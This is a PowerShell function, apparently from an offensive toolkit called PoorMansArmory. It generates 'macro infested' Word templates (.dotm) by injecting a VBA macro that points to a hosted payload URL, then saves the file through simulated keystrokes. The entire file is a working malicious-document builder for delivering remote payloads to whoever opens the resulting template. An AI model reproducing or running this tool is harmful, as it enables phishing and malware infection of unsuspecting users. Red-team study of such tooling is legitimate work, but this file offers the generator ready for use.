function Build-MacroTemplate {
#.SYNOPSIS
# Generate Macro Infested Word Templates (.dotm)
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -TemplateName   -->  Name of the malicious Word Template (.dotm)
#   -PayloadURL     -->  URL of the hosted payload that the macro points to
#   -MacroContents  -->  Advanced: User input macro instead of the generated one
#   -Help           -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory
    

    Param(
        [string]$TemplateName,
        [string]$PayloadURL,
        [string]$MacroContents,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Generate-WordTemplate) }


    # Minor Error Correction (To-Do)
    if (!$MacroContents -and !$PayloadURL) { return (Write-Host 'Input macro contents or payload URL.' -ForegroundColor Red) }
    if ($PayloadURL -notlike "http*")      { return (Write-Host 'Payload URL not in correct format.' -ForegroundColor Red)   }
    if (!$TemplateName)                    { return (Write-Host 'Template name not input.' -ForegroundColor Red)       } 
    if ($TemplateName -notlike '*.dotm')   { return (Write-Host 'Template must be a .dotm file.' -ForegroundColor Red) }
    

    # Establish Variables
    $libBuildMacro = "$PSScriptRoot/Build-VBAMacro.ps1"
    $OutputPath    = "$PSScriptRoot/../outputs/templateInjected"
    $TemplatePath  = "$OutputPath/$TemplateName"


    # Path Validation
    if (Test-Path -LiteralPath $OutputPath) { $OutputPath = (Get-Item -LiteralPath $OutputPath).FullName }
    else { return (Write-Host 'Failed to validate output path.' -ForegroundColor Red) }

    if ((Test-Path -LiteralPath $TemplatePath)) { return (Write-Host 'Target document already exists.' -ForegroundColor Red) }


    # Generate Macro if not Specified
    if (!$MacroContents) {

        if (Test-Path -LiteralPath $libBuildMacro) { $libBuildMacro = (Get-Item -LiteralPath $libBuildMacro).FullName }
        else { return (Write-Host "Unable to find 'Build-VBAMacro.ps1.'" -ForegroundColor Red) }

        . $libBuildMacro

        Write-Host "[+] Generating VBA Macro..." -ForegroundColor Yellow
        Write-Host " o  Pointing to '$PayloadURL'..."
        $MacroContents = Build-VBAMacro -PayloadURL $PayloadURL -PrivateSub
        Write-Host " o  Done.`n"
        Start-Sleep -Milliseconds 750
    }


    Try {
        Write-Host "[+] Generating Macro Infested Word Template (.dotm)..." -ForegroundColor Yellow

        New-Item -Path $TemplatePath | Out-Null
        $Word = New-Object -ComObject "Word.Application"
        Write-Host " o  Creating '$TemplateName'..."
        Start-Sleep -Milliseconds 1500

        $WordTemplate = $Word.Documents.Open($TemplatePath)
        Write-Host " o  Opening document with Word Application API..."
        Start-Sleep -Milliseconds 1500

        $InsertMac = $WordTemplate.VBProject.VBComponents.Item(1)
        Write-Host " o  Initializing VB components..."
        Start-Sleep -Milliseconds 1500

        $InsertMac.CodeModule.AddFromString($MacroContents)
        Write-Host " o  Inserting macro contents..."
        Start-Sleep -Milliseconds 1500

        Write-Host " o  Attempting to save document via keystrokes..."
        $Word.Quit()
        Start-Sleep -Milliseconds 1500
        $wShell = New-Object -ComObject Wscript.Shell
        $wShell.AppActivate('Word') | Out-Null
        Start-Sleep -Milliseconds 250
        $wShell.SendKeys('{ENTER}') | Out-Null

        Write-Host " o  Cleaning up..."
        Start-Sleep -Milliseconds 1500
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($Word) | Out-Null
    }

    Catch { return (Write-Host "`n[-] An error occured.`n" -ForegroundColor Red) }


    if (Test-Path -LiteralPath $TemplatePath) { return (Write-Host " o  '$TemplateName' was successfully generated.`n") }
    else { return (Write-host "`n[-] '$TemplateName' failed to create.`n" -ForegroundColor Red) }
}